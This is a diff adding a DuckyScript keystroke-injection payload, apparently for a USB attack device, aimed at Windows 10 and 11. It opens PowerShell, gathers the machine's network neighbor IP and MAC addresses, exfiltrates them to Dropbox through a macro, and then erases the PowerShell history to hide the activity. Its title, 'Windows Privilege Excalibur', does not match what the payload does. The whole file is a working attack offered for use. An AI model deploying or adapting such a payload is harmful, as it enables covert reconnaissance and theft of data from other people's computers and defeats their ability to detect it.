@@ -1,0 +1,18 @@
+REM     Title: Windows Privilege Excalibur
+REM     Author: Who-Is-Julien
+REM     Description: This payload exfiltrate an ARP scan of the target computer.
+REM     Target: Windows 10, 11
+
+DELAY 2000
+
+GUI x
+
+DELAY 1000
+STRING i
+
+DELAY 2000
+STRING $report = Get-NetNeighbor -State Stale,Reachable | Format-List -Property IPAddress,LinkLayerAddress | Out-String; 
+POWERSHELL_TO_DROPBOX()
+STRING ; Remove-Item (Get-PSReadLineOption).HistorySavePath; exit
+DELAY 500
+ENTER
